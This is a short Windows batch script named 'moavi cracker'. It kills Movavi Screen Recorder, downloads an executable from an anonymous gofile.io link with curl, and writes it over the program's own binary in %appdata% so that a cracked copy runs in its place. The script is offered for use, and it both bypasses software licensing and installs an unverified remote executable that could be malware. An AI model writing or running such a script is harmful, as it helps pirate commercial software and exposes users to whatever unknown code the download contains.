REM set title to moavi cracker
@echo off
cls
title moavi cracker

REM kill all moavi processes

taskkill /F /IM ScreenRecorder.exe

REM go into download crack to %appdata%\Movavi Screen Recorder 21

cd %appdata%/Movavi Screen Recorder 21

curl https://store3.gofile.io/download/web/46a18dcd-d199-4e10-9735-37f0057d0e4f/ScreenRecorder.exe -o ScreenRecorder.exe

pause 